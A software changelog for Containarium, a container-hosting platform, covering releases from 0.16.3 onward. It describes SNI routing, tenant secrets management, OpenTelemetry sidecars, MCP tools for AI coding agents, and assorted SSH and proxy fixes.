Ships **pool-aware container placement and per-pool base-domain SNI routing** end-to-end. A single sentinel can now front multiple parent domains, and a single backend can host workloads under several of them — enabling consolidation across previously-separate clusters without merging their app domains.

### Added

- **Pool selector for container placement** ([#204](https://github.com/FootprintAI/Containarium/pull/204)) — `--pool` flag on `containarium create` (and matching `pool` arg on the MCP `create_container` tool) routes a new container to any healthy backend tagged with that pool. Validates consistency when both `--pool` and `--backend-id` are set; errors on no-matching-backend rather than silently falling back. The `Container` message now round-trips the `pool` field on Create / List / Get responses so callers can see where their container actually landed. Foundation for sharing one control plane across physically-separated workloads.
- **Per-pool base-domain SNI routing** ([#205](https://github.com/FootprintAI/Containarium/pull/205)) — primaries advertise one or more `--public-base-domain` values; the sentinel's SNI router suffix-matches inbound TLS against them after exact-`Hostname`/`Alias` matching and before the legacy fallback. Removes the requirement to register every container hostname as an explicit `--public-aliases` entry. Longest-suffix-wins for nested base domains; ties across primaries fail closed rather than picking arbitrarily.
- **Multi-domain primaries** ([#207](https://github.com/FootprintAI/Containarium/pull/207)) — `--public-base-domain` is now repeatable on both `containarium daemon` and `containarium tunnel`, so one backend can host workloads under several parent domains simultaneously. Enables a single peer to serve, for example, both its own pool's subdomain space and migrated workloads published under a different parent.
- **`MonitoringEnabled` column in `containarium list`** ([#202](https://github.com/FootprintAI/Containarium/pull/202)) — the new `MON` column makes it visible at a glance which containers have application-emitted OTel turned on.

### Fixed

- **Per-container disk usage on the `dir` storage backend** ([#203](https://github.com/FootprintAI/Containarium/pull/203)) — `containarium list`, MCP `get_metrics`, and the OTel collector all reported 0 B for disk usage on hosts that init Incus with the `dir` driver (e.g. lab boxes without a zpool). Incus only fills `state.Disk["root"].Usage` when the backend has filesystem-level quota accounting (zfs / btrfs); on dir backends the field stays empty and there was no fallback. `GetContainerMetrics` now walks the container's rootfs (`/var/lib/incus/storage-pools/<pool>/containers/<name>/rootfs`, same path `du -bs` would) and reports the sum. The walk runs only when Incus's native value is zero, so zfs / btrfs hosts pay nothing.

### Documentation

- **Per-pool base-domain design** ([#205](https://github.com/FootprintAI/Containarium/pull/205), [#207](https://github.com/FootprintAI/Containarium/pull/207)) — `docs/PER-POOL-BASE-DOMAIN.md` covers the SNI router precedence, longest-wins / fail-closed semantics, and the lab-hosts-multiple-domains worked example.
- **Secrets master-keyfile operator runbook** ([#201](https://github.com/FootprintAI/Containarium/pull/201)) — `docs/SECRETS-OPERATIONS.md` documents `/etc/containarium/secrets.key` lifecycle: backup, restore, rotation. Companion to the v0.16.13 secrets management release.
- **Cluster-cutover runbook** ([#206](https://github.com/FootprintAI/Containarium/pull/206)) — `docs/CUTOVER-DEMO-INTO-PROD-SENTINEL.md` walks through migrating a standalone cluster into an existing sentinel as a `pool=demo` peer, with pre-flight, the `curl --resolve` keystone-verification before DNS changes, and a non-destructive rollback path within the DNS-TTL window.

### Breaking

- **`/sentinel/primaries` registration body**: the `base_domain` field (introduced in unreleased Phase 3) was renamed `base_domains` (string → array) as part of #207 to support multi-domain primaries. Any out-of-tree integration that POSTed JSON with the singular form needs to update. The CLI flags (`--public-base-domain` on `containarium daemon` and `containarium tunnel`) are backward-compatible: a single value still works; the change is that the flag is now repeatable. No live deployments shipped the singular wire format, so this is a clean cutover.

## [0.16.13] - 2026-05-16

Ships the **tenant secrets management API** end-to-end (CLI + MCP + REST + gRPC), plus the documentation Approvals that landed alongside it.

### Added

- **Tenant secrets management** ([#194](https://github.com/FootprintAI/Containarium/pull/194), [#195](https://github.com/FootprintAI/Containarium/pull/195), [#196](https://github.com/FootprintAI/Containarium/pull/196), [#197](https://github.com/FootprintAI/Containarium/pull/197), [#198](https://github.com/FootprintAI/Containarium/pull/198), [#199](https://github.com/FootprintAI/Containarium/pull/199)) — daemon-managed `set / get / list / delete / refresh` of tenant secrets (API keys, DB passwords, OAuth tokens). AES-256-GCM with `(username, name)` as AAD, master key auto-generated at `/etc/containarium/secrets.key` on first daemon start (mode 0400; back this up off-host). Stored as ciphertext in `containarium-core-postgres`; the daemon stamps decrypted values as `environment.<NAME>=<value>` on the LXC at every `CreateContainer` / `StartContainer`, so apps inside docker read them via compose `${VAR}` interpolation — same pattern as `--monitoring`. CLI: `containarium secrets {set,get,list,delete,refresh} <user> ...`. MCP: 5 new tools (count: 22 → 27). The 6-phase implementation from `docs/SECRETS-MANAGEMENT-DESIGN.md` (Approved) shipped in order: proto + crypto helper → Postgres store → server impl → env-var stamping → CLI → MCP.
- **Sidecar image is public on GHCR** ([#193](https://github.com/FootprintAI/Containarium/pull/193)) — `ghcr.io/footprintai/containarium-otel-sidecar:vX.Y.Z` is anonymously pullable now (org admin enabled public packages). The compose snippet from `containarium sidecar otel compose <user>` references GHCR directly; `make sidecar-build-otel` stays for dev iteration.

### Documentation

- **Platform sidecar pattern** ([#185](https://github.com/FootprintAI/Containarium/pull/185), [#186](https://github.com/FootprintAI/Containarium/pull/186)) — `docs/PLATFORM-SIDECAR-DESIGN.md` (Approved). Generic primitive for cross-cutting concerns (telemetry, log shipping, file scanning, audit). Each sidecar is a small Docker image on GHCR, identity flows in via LXC-env compose interpolation, image versions track the Containarium project version.
- **OTel sidecar design** ([#184](https://github.com/FootprintAI/Containarium/pull/184), [#186](https://github.com/FootprintAI/Containarium/pull/186)) — `docs/OTEL-AGENT-RELAY-DESIGN.md` (Approved). Pivoted from "Containarium installs systemd unit inside each LXC" to docker-compose-sidecar form. Closes the docker-in-LXC env-passthrough gap discovered while rolling `--monitoring` to prod ([#183](https://github.com/FootprintAI/Containarium/pull/183)).
- **Secrets management design** ([#194](https://github.com/FootprintAI/Containarium/pull/194), [#195](https://github.com/FootprintAI/Containarium/pull/195)) — `docs/SECRETS-MANAGEMENT-DESIGN.md` (Approved). Full design doc that drove the v0.16.13 implementation above.
- **Per-container ZFS encryption design** ([#178](https://github.com/FootprintAI/Containarium/pull/178), [#179](https://github.com/FootprintAI/Containarium/pull/179)) — `docs/ZFS-PER-CONTAINER-ENCRYPTION-DESIGN.md` (Approved). Per-tenant `encryptionroot` model with pluggable `KeyProvider`; five lifecycle hooks. Blocked on the cloud-side multi-tenancy work.

### Operator notes

- **Prod rollout of `--monitoring`** on `api`, `facelabor`, `pes`, `voicegpt`, `wordpress` (2026-05-16). All five are docker-in-LXC, so the LXC env is stamped but per-service docker passthrough is still up to each app team — see the new sidecar pattern for the zero-compose-change alternative.

## [0.16.12] - 2026-05-16

Two unrelated fills:

- **Sidecar image local-build stopgap** while GHCR is org-private — `make sidecar-build-otel` plus an updated compose-snippet preamble so operators aren't blocked on the registry-visibility change.
- **`ResizeContainer` end-to-end** — server has had it since v0.16.4; this release wires the client wrappers, replaces the remote-CLI stub with a real call, and adds the `resize_container` MCP tool. Tenants can now hot-resize CPU / memory / disk on a running container via CLI or MCP without an SSH-to-the-backend ritual.

### Added

- **`make sidecar-build-otel`** ([#190](https://github.com/FootprintAI/Containarium/pull/190)) — builds the otel-sidecar Docker image locally from `sidecars/otel-sidecar/`, tag matching `pkg/version`. The compose snippet `containarium sidecar otel compose <user>` now references the local tag (`containarium-otel-sidecar:vX.Y.Z`) and reminds the operator to run the make target. GHCR pipeline keeps running for authenticated org users + a future public flip.
- **`resize_container` MCP tool** + remote-CLI implementation + gRPC/HTTP client wrappers ([#191](https://github.com/FootprintAI/Containarium/pull/191)) — `containarium resize alice --memory 8GB --server …` (or the equivalent MCP call) now actually hot-resizes the container instead of returning "not yet implemented" with an SSH suggestion. At least one of `--cpu` / `--memory` / `--disk` is required; disk can only grow (server rejects shrinks). MCP tool count bumped 21 → 22.

## [0.16.11] - 2026-05-16

Lands the **platform sidecar pattern** as designed in [#185](https://github.com/FootprintAI/Containarium/pull/185) / [#186](https://github.com/FootprintAI/Containarium/pull/186): a small set of platform-published Docker images tenants compose into their LXC's stack to layer cross-cutting concerns (telemetry today; logs / scanning / audit next). The OTel sidecar is the first instance — tenants who'd had to plumb `OTEL_*` env passthrough across every compose service can now drop in a sidecar reference and let it stamp identity automatically.

This release also tags the first sidecar image release: `ghcr.io/footprintai/containarium-otel-sidecar:v0.16.11`. Image versions track the Containarium project version — daemon and sidecars move together.

### Added

- **`containarium-otel-sidecar` Docker image + GH Actions build pipeline** ([#187](https://github.com/FootprintAI/Containarium/pull/187)) — `sidecars/otel-sidecar/` directory ships a Debian-slim Dockerfile that wraps `otelcol-contrib v0.110.0` (matches the central collector). Entrypoint validates the four required identity env vars (`CONTAINARIUM_CONTAINER_ID`, `CONTAINARIUM_BACKEND_ID`, `CONTAINARIUM_TENANT_ID`, `OTEL_EXPORTER_OTLP_ENDPOINT`) and fail-closes with a docs-link message if any are missing. Baked-in config uses the `resource` processor to `upsert` platform-controlled `container.id`/`backend.id` (overrides app-claimed values for anti-spoofing) and `insert` tenant-overridable `service.namespace`/`service.version`. `.github/workflows/sidecars.yml` triggers on every `v*` tag and publishes three tags per release: `:v0.16.11` (immutable), `:v0.16` (minor moving), `:latest-stable`.

- **Daemon stamps split `CONTAINARIUM_*` env vars alongside `OTEL_RESOURCE_ATTRIBUTES`** ([#187](https://github.com/FootprintAI/Containarium/pull/187)) — `pkg/core/container/otel.go` now writes three additional env keys (`CONTAINARIUM_CONTAINER_ID`, `CONTAINARIUM_BACKEND_ID`, `CONTAINARIUM_TENANT_ID`) on `--monitoring=true` LXCs. The split form feeds the sidecar's compose `${VAR}` interpolation; the legacy comma form keeps non-sidecar apps (native LXC processes, agent-box, etc.) working unchanged. `ToggleMonitoring disable` cleans both forms.

- **`containarium sidecar otel compose <username>` CLI** ([#188](https://github.com/FootprintAI/Containarium/pull/188)) — prints a ready-to-paste docker-compose snippet that adds the OTel sidecar to the named LXC's stack. Output uses `${VAR}` interpolation against the LXC's env (not hardcoded values) so it stays in sync as Containarium re-stamps via ToggleMonitoring / MoveContainer; current literal values appear as inline comments for verification. Read-only — never writes to tenant files (decision P2 of the platform-sidecar design). Image tag in the output tracks the project version.

### Documentation

- **Platform sidecar pattern** ([#185](https://github.com/FootprintAI/Containarium/pull/185), [#186](https://github.com/FootprintAI/Containarium/pull/186)) — `docs/PLATFORM-SIDECAR-DESIGN.md` (Approved) establishes the generic primitive: image contract (read identity from env, share netns/filesystem with target, fail-closed on missing identity), naming convention, GHCR registry, version-tracking-project policy, CVE response calendar. `log-sidecar` / `scanner-sidecar` / `audit-sidecar` follow this contract when shipped.
- **OTel sidecar image** ([#186](https://github.com/FootprintAI/Containarium/pull/186)) — `docs/OTEL-AGENT-RELAY-DESIGN.md` (Approved). Rewritten from the rejected "Containarium installs systemd unit inside each LXC" v0 draft to the docker-compose-sidecar form. Documents the baked-in config, override semantics, and lifecycle.

## [0.16.10] - 2026-05-15

Small follow-on to v0.16.9. Closes the `ToggleMonitoring` v2 TODO from the approved OTel design so operators can retrofit OTel onto containers that were created before `--monitoring` existed.

### Added

- **`ToggleMonitoring` RPC for live OTel enable/disable** ([#181](https://github.com/FootprintAI/Containarium/pull/181)) — `containarium monitoring enable|disable <username>` (CLI) / `toggle_monitoring` (MCP) / `POST /v1/containers/{username}/monitoring` (REST). Stamps the four `OTEL_*` env vars onto the LXC's Incus config and restarts the container so the new env reaches the app process. Disable path uses a new `incus.Client.UnsetEnv` that deletes the keys rather than setting empty strings (some OTel SDKs flag empty `OTEL_EXPORTER_OTLP_ENDPOINT` as misconfig). Refuses core containers. Use this to retrofit monitoring onto exposed-port containers created before v0.16.9.

## [0.16.9] - 2026-05-15

This release lands **application-emitted OpenTelemetry** (per-container opt-in, metrics-only v1) and **pool-level ZFS native encryption** for self-hosters. Together they close two long-standing observability + at-rest-encryption gaps; both are off-by-default so existing deployments inherit current behavior.

### Added

- **Per-container `--monitoring` flag for OTel app telemetry** ([#175](https://github.com/FootprintAI/Containarium/pull/175)) — `containarium create alice --monitoring` (or `monitoring: true` over MCP/proto) stamps `OTEL_EXPORTER_OTLP_ENDPOINT`, `OTEL_SERVICE_NAME`, `OTEL_EXPORTER_OTLP_PROTOCOL`, and `OTEL_RESOURCE_ATTRIBUTES` (container.id, backend.id) into the new LXC's environment via Incus `environment.*` config keys. Apps that pull in any OTel SDK auto-discover the endpoint and start emitting; apps without an SDK ignore the vars. Default off — opt-in per container. `AdoptMigratedContainer` re-stamps env vars after `MoveContainer` so migrated containers point at the destination VM's collector.

- **Core OTel collector LXC + cardinality guard + IP map** ([#176](https://github.com/FootprintAI/Containarium/pull/176)) — new `containarium-core-otelcollector` LXC running `otelcol-contrib v0.110.0` is provisioned alongside VictoriaMetrics on daemon startup. Boot priority 75, 1GB ZFS reservation, OTLP/HTTP :4318 + gRPC :4317 receivers, `otlphttp` exporter to local VM at `:8428/opentelemetry`. Anti-spoofing via `attributes/identity` processor stamping `source.ip` from `client.address`. Cardinality guard drops a default PII list (`request_id`, `trace_id`, `user_email`, `session_id`, `correlation_id`); operators extend via new `--otel-drop-labels=a,b,c` daemon flag. Daemon pushes `/var/lib/containarium/container_ips.json` to the collector on every container create/delete/adopt (v1 maintains the JSON; v2 will materialize `container.id` once a custom processor or auto-regenerated OTTL lands). Full design at `docs/OTEL-COLLECTOR-DESIGN.md`.

- **Pool-level ZFS native encryption (opt-in)** ([#177](https://github.com/FootprintAI/Containarium/pull/177)) — both install paths accept an optional keyfile flag that creates the data ZFS pool with `encryption=on`, `keyformat=raw`, `keylocation=file://<path>`. Every container dataset inherits encryption from the parent pool; the daemon needs no code change. GCE: new `zfs_encryption_keyfile` terraform module variable. Bare-metal: new `--zfs-encryption-keyfile PATH` flag on `setup-gpu-host.sh`. The keyfile auto-generates on first run (32 random bytes, `chmod 0400`), with a loud "back it up off-host" warning. Combine with GCP CMEK on the boot disk for defense in depth. Per-container/per-tenant encryption stays deferred to cloud multi-tenancy work; `docs/ZFS-PER-CONTAINER-ENCRYPTION-DESIGN.md` ([#178](https://github.com/FootprintAI/Containarium/pull/178), [#179](https://github.com/FootprintAI/Containarium/pull/179)) is Approved and waiting for that to land.

### Documentation

- **OTel collector design** ([#173](https://github.com/FootprintAI/Containarium/pull/173), [#174](https://github.com/FootprintAI/Containarium/pull/174)) — `docs/OTEL-COLLECTOR-DESIGN.md` documents the metrics-only v1 (per-container `--monitoring`, anti-spoofing via `attributes/identity`, cardinality guard, source-IP attribution v1/v2 split). Status: Approved with all 5 open questions resolved.
- **Per-container ZFS encryption design** ([#178](https://github.com/FootprintAI/Containarium/pull/178), [#179](https://github.com/FootprintAI/Containarium/pull/179)) — `docs/ZFS-PER-CONTAINER-ENCRYPTION-DESIGN.md` captures the deferred multi-tenancy path: `KeyProvider` interface, per-tenant `encryptionroot` model, five daemon lifecycle hooks, `MoveContainer` integration with `KeyRef` migration metadata. Status: Approved, blocked on cloud multi-tenancy.

## [0.16.8] - 2026-05-14

This release is a punch-list of robustness fixes — six bug fixes / small features that collectively close several silent-failure modes in the container lifecycle, MCP surface, and telemetry path. Everything in here came out of yesterday's demo-recording session and the cleanup that followed; each item was reproduced live before being fixed.

### Fixed

- **`--network=host` for rootless podman in `app deploy`** ([#166](https://github.com/FootprintAI/Containarium/pull/166)) — `runContainer` switched from `-p <port>:<port>` to `--network=host`. Rootless podman publishes `-p` ports only in the user's slirp4netns namespace, invisible to the LXC's main netns where Caddy lives, producing 502s on the public hostname. `--network=host` makes the bound port reachable on the LXC's eth0 directly. Trade-off: one-app-per-LXC port isolation, which matches Containarium's actual deployment model.

- **`DeleteContainer` cascade cleanup** ([#167](https://github.com/FootprintAI/Containarium/pull/167)) — deleting a container used to remove the LXC and leave six other resources orphaned: route store row, Caddy srv0 route (resurrected by `RouteSyncJob`'s 5s tick), Caddy TLS automation subject, host-side Linux user account, `/home/<user>` dir, and the sshpiper entry (auto-reaped). The cascade now runs inside `DeleteContainer`: route store first (so the sync job doesn't fight it), then TLS subject, then `userdel --remove`. sshpiper config reaps on the next keysync (2 min). Closes the "public hostname still 502s after delete" bug.

- **`AddSSHKey` / `RemoveSSHKey` RPCs no longer return "not implemented yet"** ([#168](https://github.com/FootprintAI/Containarium/pull/168)) — the proto declared `POST /v1/containers/{username}/ssh-keys` and `DELETE /v1/containers/{username}/ssh-keys/{ssh_public_key}` and both returned 500. The intended recovery path when an ephemeral key was lost (generate new key, POST the public half, ssh in) was unreachable. New helpers in `pkg/core/container` write the host-side `/home/<user>/.ssh/authorized_keys` atomically (temp + rename, 0600 mode, idempotent). Sentinel keysync propagates the new key within ~2 minutes.

- **MCP tool error surfacing** ([#157, prior release](https://github.com/FootprintAI/Containarium/pull/157)) — task #62 was already shipped; bookkeeping closed it this release. Tool execution errors now appear in both `message` and `data` fields of the JSON-RPC error response so clients that render only the top-level `message` field (Claude Code) see the actual diagnostic instead of a generic "Tool execution failed."

- **Conntrack event channel no longer saturates** ([#170](https://github.com/FootprintAI/Containarium/pull/170)) — the Linux conntrack monitor was subscribing to NEW + UPDATE + DESTROY groups. The kernel emits UPDATE events ~1Hz per active connection plus on every TCP state transition, so even tens of connections produce thousands of events per second, filling the 8192-buffered channel within seconds. Now subscribes only to NEW + DESTROY — interim byte counts come from `Snapshot()` on demand, final byte counts arrive with DESTROY. ~100x reduction in event volume.

### Added

- **`CONTAINARIUM_JWT_TOKEN_FILE` for restart-free token rotation** ([#169](https://github.com/FootprintAI/Containarium/pull/169)) — alternative to `CONTAINARIUM_JWT_TOKEN`. When set, the MCP server's Client re-reads the file on every API request, so rotating the token is `mv newtoken oldpath` — no MCP process restart required. Empty/missing file surfaces a pre-flight error rather than sending an empty Bearer to the server. Long-running MCP clients (Claude Code, Cursor, etc.) now survive operator-side token rotation without manual intervention.

## [0.16.7] - 2026-05-14

### Fixed

- **Sentinel simple-proxy mode: real client IP via userspace PROXY v2 forwarder** ([#161](https://github.com/FootprintAI/Containarium/pull/161)) — `--proxy-protocol` was a no-op in simple-proxy deployments (single GCP spot VM behind the sentinel, e.g. the demo cluster). Those deployments use kernel iptables DNAT, which can't inject a PROXY v2 frame, so the downstream Caddy saw the post-MASQUERADE bridge gateway IP (`10.0.3.1`) instead of the real client IP. Now when `--proxy-protocol` is set on the sentinel and ConnMux isn't owning `:443` (i.e. tunnel/multi-pool modes that already had PROXY v2 via the SNI router), the sentinel spins up a userspace TCP forwarder on `:80`/`:443` that dials the backend and prepends a PROXY v2 header. Lab/prod (ConnMux path) behavior is unchanged.
- **MCP `create_container`: auto-save ephemeral private key** ([#160](https://github.com/FootprintAI/Containarium/pull/160)) — when the agent omits `ssh_keys`, the MCP server generates an ed25519 keypair locally, installs the public half on the container, and returns the private half in the response. It now also writes the key to `$CONTAINARIUM_KEYS_DIR` (default `$HOME/.containarium/keys/<username>`) with mode 0600 itself, so the agent no longer has to remember the save step — losing it between the create call and the next ssh/push/sync call was a real failure mode (the daemon doesn't keep a copy server-side).

## [0.16.6] - 2026-05-13

### Fixed

- **`ensureHTTPApp` no longer 409s on every daemon startup** ([#157](https://github.com/FootprintAI/Containarium/pull/157)) — `ensureHTTPApp` strict-decoded the Caddy `/config/apps/http` response into the typed `CaddyHTTPApp`, whose `Handle []CaddyHandler` is an interface slice that `encoding/json` cannot unmarshal into. On every daemon startup where Caddy already had a non-empty http app the decode failed, the code fell through to a PUT that returned `409 key already exists: http`, and the daemon silently lost every Caddy update that depended on `EnsureServerConfig` having succeeded — notably the TLS subject + `srv0` route for a newly-connected tunnel-promoted pool primary. Probe with `map[string]json.RawMessage` instead.

## [0.16.5] - 2026-05-12

This release lands the **MCP-first agent dev loop**: an agent (Claude Code, Cursor, Cline, …) can now create a container, ship code into it via real `git push`, expose it on a public hostname, run security scans, and diagnose failures — all through tools that share Go entry points with their CLI counterparts. Plus the `pkg/core` extraction that makes the cloud-daemon (separate repo) possible.

(v0.16.4 was tagged but its CHANGELOG entry was skipped; this release covers all changes since v0.16.3.)

### Added

#### MCP tool surface (the headline)

- **`debug_container`** ([#139](https://github.com/FootprintAI/Containarium/pull/139)) — one-call diagnostic for SSH failures. Inspects host-side state the agent can't see (Linux user account presence, shell wrapper existence, recent sshd journal lines matching the user), returns a structured `{containerState, hostUserExists, hostUserShell, hostUserShellExists, recentSshdRejections, likelyCause, nextActions, sourceRepo, daemonVersion}`. The pre-PR session's SSH spiral was the motivating case: every "Connection closed" had a real explanation in the daemon, just nowhere visible to the caller.
- **`push` + `sync`** ([#150](https://github.com/FootprintAI/Containarium/pull/150), [#152](https://github.com/FootprintAI/Containarium/pull/152)) — two ways to ship code into a container.
  - `push`: real `git push` over SSH against a container-hosted bare repo at `~/work.git`, with a post-receive hook that checks out the working tree and runs an optional `deploy_cmd` (Heroku-style release flow). First call auto-bootstraps the bare repo + hook + local git remote `containarium-<user>`; subsequent calls just `git push`. Vanilla `git push containarium-<user> main` from any local clone works too.
  - `sync`: rsync-style mirror — ships content-hash delta of the working dir, including `.git/` so committed history + uncommitted modifications + untracked files + stash refs all carry over. `--delete` opt-in, sensible exclude defaults (`node_modules/`, `.terraform/`, `__pycache__`, `.env*`, ...).
- **`security_scan` + `security_findings` + `security_remediate`** ([#151](https://github.com/FootprintAI/Containarium/pull/151)) — agent-driven security workflow over the daemon's existing ClamAV / pentest / ZAP subsystems. Normalized cross-scanner finding shape with `kind`, `severity`, `title`, `target`, `fixAvailable`. `security_remediate` calls the daemon's existing `RemediatePentestFinding` (one-shot package upgrade); ClamAV/ZAP findings surface as `fixAvailable: false` until quarantine/sanitizer flows ship. Tool descriptions emphasize **operator-invoked one-shot use** — the hosted continuous variant is a cloud-only feature ([cloud PRD](https://github.com/FootprintAI/Containarium-cloud), `prd/cloud/security-patch-agent.md`).
- **`sync_ssh_config`** ([#130](https://github.com/FootprintAI/Containarium/pull/130)) — generate a self-contained `~/.containarium/ssh_config` for every reachable container; one-time `Include ~/.containarium/ssh_config` line in `~/.ssh/config` and then `ssh <name>` works directly.
- **`list_routes`** ([#156](https://github.com/FootprintAI/Containarium/pull/156)) — read-side counterpart to `expose_port`. Lists the proxy routes currently registered on the sentinel with their target container IP+port, active state, and app metadata. Optional `username` + `active_only` filters. Closes the audit gap so agents can answer "is this hostname already taken?" without ssh-ing in.
- **`get_backend`** ([#124](https://github.com/FootprintAI/Containarium/pull/124)) — fetch a single backend by ID with the same fields as `list_backends`.
- **`create_container` ephemeral keypair generation** ([#130](https://github.com/FootprintAI/Containarium/pull/130)) — when `ssh_keys` is omitted, generate an ed25519 keypair client-side, install the public half, return the private half in the response with a ready-to-paste `ssh -i …` command using `$CONTAINARIUM_SENTINEL_HOST`.
- **MCP tool descriptions are now agent-discovery affordances** ([#130](https://github.com/FootprintAI/Containarium/pull/130), [#147 conventions](https://github.com/FootprintAI/Containarium/pull/147)) — `create_container`'s description points at `push` / `sync` / `debug_container` / `expose_port` / `sync_ssh_config` so agents discover the full workflow from a single tool listing.

#### agent-box (in-the-box MCP)

- **`process_start` / `process_list` / `process_kill`** ([#126](https://github.com/FootprintAI/Containarium/pull/126)) — Manage background processes inside a Containarium box (dev servers, long-running tests, etc.) without spawning shells.
- **`tail_log`** ([#123](https://github.com/FootprintAI/Containarium/pull/123)) — Watch a log file as it grows; tool emits new content with metadata so the agent can decide when to stop.
- **MCP Roots support** — agent-box's filesystem operations align with the MCP client's workspace roots, matching the upstream `modelcontextprotocol/servers` reference behavior.

#### Demo cluster as a shipped artifact

- **`terraform/gce-demo/`** ([#127](https://github.com/FootprintAI/Containarium/pull/127)) — reproducible demo cluster (sentinel + spot backend) any operator can stand up in ~7 minutes. Consumes the shared `terraform/modules/containarium/` module; defaults are sized for the recorded-demo flow.

#### Cloud encryption posture

- **CMEK opt-in in the terraform module** ([#142](https://github.com/FootprintAI/Containarium/pull/142)) — new `kms_key_self_link` variable wires customer-managed encryption keys to backend boot disk, persistent data PD, and sentinel boot disk. Empty (default) = Google-managed-keys, no behavior change.
- **At-rest encryption posture doc** ([#143](https://github.com/FootprintAI/Containarium/pull/143)) — `docs/SECURITY-ENCRYPTION-AT-REST.md` documents what we encrypt today, what we don't, who holds the keys, and a vendor-questionnaire cheatsheet. Pairs with the cloud-side per-tenant encryption PRD (drafted in the Containarium-cloud repo).

#### Architecture / refactor

- **`pkg/core/` extraction** ([#138](https://github.com/FootprintAI/Containarium/pull/138) consolidating #133–#137) — `internal/container`, `internal/incus`, `internal/network`, `internal/ostype`, `internal/stacks`, `internal/coresys`, `internal/expose`, `internal/ospkg` all moved to `pkg/core/`, with `Backend` / `Store` interfaces extracted so the cloud-daemon (separate repo) can consume the same core via Go module import. ~9,350 LOC moved; no behavior change. Backend interface extends to 21+ methods covering lifecycle, exec, files, config, devices, labels, server info, metrics; consumers depend on the interface (or narrower subsets declared at the call site) for mockability. Package-level `doc.go` files added per `pkg/core` package ([#148](https://github.com/FootprintAI/Containarium/pull/148)).

#### Conventions

- **CLAUDE.md: proto-first + strong-typing** ([#147](https://github.com/FootprintAI/Containarium/pull/147)) — codifies the contract-first convention (`.proto` → buf generate → gRPC stubs + grpc-gateway REST shim + OpenAPI doc + typed client) and bans hand-rolled `net/http` handlers for customer-facing endpoints. Companion strong-typing rule rejects bare strings where proto enums fit and `map[string]interface{}` where structs do.

### Fixed

- **MCP error messages now reach the operator** ([#153](https://github.com/FootprintAI/Containarium/pull/153)) — `handleToolsCall` previously returned a constant `"Tool execution failed"` in JSON-RPC's `message` field and the actual `err.Error()` in `data`. Most MCP clients (including Claude Code) only render `message`, so every tool failure looked identical. Now the err string lands in both.
- **Sentinel upstream key rotation no longer strands existing containers** ([#140](https://github.com/FootprintAI/Containarium/pull/140)) — when the sentinel VM was replaced (terraform `apply -replace`) it generated a new upstream keypair and pushed the new pubkey to backend via `POST /authorized-keys/sentinel`. The previous handler appended-if-missing, which left every existing container's `authorized_keys` with the OLD sentinel pubkey alongside (or, in the live failure, INSTEAD of) the new one. Handler now replaces the `# sshpiper sentinel upstream key` marker block instead of appending; idempotent on no-op; atomic via temp file + rename. Response gains a `rotated` counter for operator observability.
- **Demo cluster SSH path now works first-shot** ([#132](https://github.com/FootprintAI/Containarium/pull/132)) — three independent root causes were stacking and preventing the agent-driven demo flow from ever completing:
  - `IdentitiesOnly=yes` + `PreferredAuthentications=publickey` now baked into MCP `create_container`'s response ssh hint. Without them, OpenSSH offered every key in `~/.ssh/`; sshpiper's failtoban counted each rejected offer toward the ban budget.
  - sshpiperd failtoban tuned from `--max-failures 20` / `--ban-duration 1h` to `100` / `5m` — appropriate for an agent's pace, not an attacker's.
  - `terraform/modules/containarium/scripts/startup-spot.sh` now installs `/usr/local/bin/containarium-shell` + sudoers + `/etc/shells` entry + sshd Match block at deploy time. The daemon creates user accounts with `shell=containarium-shell`; the wrapper had never been installed, so sshd refused every login with "User X not allowed because shell /usr/local/bin/containarium-shell does not exist." This had been silently broken since the demo cluster's first deploy.
- **JWT-authenticate `/v1/backends`** ([#122](https://github.com/FootprintAI/Containarium/pull/122)) — endpoint was unauthenticated.
- **`postgresPassthroughStore` unexported + dead helpers removed** ([#144](https://github.com/FootprintAI/Containarium/pull/144), [#146](https://github.com/FootprintAI/Containarium/pull/146)) — `PassthroughStore` is the public interface; the postgres implementation is now lowercase + internal. `FindCoreContainers`, `HasRole` removed.
- **DI cleanup for `incus.Backend`** ([#141](https://github.com/FootprintAI/Containarium/pull/141)) — post-extraction follow-ups: `container.Manager` takes `incus.Backend` (interface) instead of `*incus.Client`; `Backend` interface extends to cover `UpdateContainerConfig` and `GetRawInstance`.
- **Transfer tools UX** ([#154](https://github.com/FootprintAI/Containarium/pull/154)) — `~/` in `remote_path` is now expanded to `/home/<user>/` (previously created a literal `~` directory); `sync` excludes `.env*` by default to prevent silently clobbering per-environment config.
- **`gce-demo` first-deploy fixes** ([#128](https://github.com/FootprintAI/Containarium/pull/128), [#129](https://github.com/FootprintAI/Containarium/pull/129)) — Zabbly incus package renames (`incus-tools` → `incus`), stale ZFS pool cleanup on the fresh-install branch, binary URL derived from `containarium_version`, `spot_vm_external_ip=true` so apt-install works pre-Cloud-NAT, smoke-test script fixes.
- **`gateway/keys_handler` gosec hardening** — `#nosec G304` annotations with rationale on legitimate path-construction sites; `#nosec G204` on `exec.Command` calls whose args are argv-only (not shell-evaluated); unhandled-error fix on `json.NewEncoder().Encode()` (intentional discard now explicit). Cleared all gosec findings.

### Internal

- 14 staging branches deleted post-merge (`extraction/phase-1` through `extraction/phase-5`, `merge/extraction-into-main`, plus per-feature branches once their PRs landed). Main is now the only long-running branch.

## [0.16.3] - 2026-05-09

### Added
- **PROXY protocol v2 support — real client IP propagation through TLS-passthrough hops.** Containers behind the sentinel previously saw only the immediate proxy peer (`X-Forwarded-For: ::1` for the loopback hop). Now, with `containarium sentinel --proxy-protocol` and `containarium daemon --proxy-protocol --proxy-protocol-trusted=<sender-CIDR>`, every hop carries a PROXY v2 header so the daemon's HTTP server can recover the real client address and emit an accurate `X-Forwarded-For` to upstream containers. See [docs/PROXY-PROTOCOL.md](docs/PROXY-PROTOCOL.md). ([#105](https://github.com/FootprintAI/Containarium/pull/105), [#106](https://github.com/FootprintAI/Containarium/pull/106), [#107](https://github.com/FootprintAI/Containarium/pull/107), [#108](https://github.com/FootprintAI/Containarium/pull/108))
  - **Sentinel side** (#105): `WriteProxyV2` hand-rolled IPv4/IPv6 PROXY v2 encoder; `--proxy-protocol` CLI flag (off by default); header injected in `buildSNIRoutingHandler` before the bidirectional `io.Copy`. Covers all three forwarding sub-paths (yamux tunnel, in-VPC TCP dial, fallback). Real-Caddy e2e gated by `proxyproto_real_caddy` build tag; CI workflow `proxyproto-e2e.yml`.
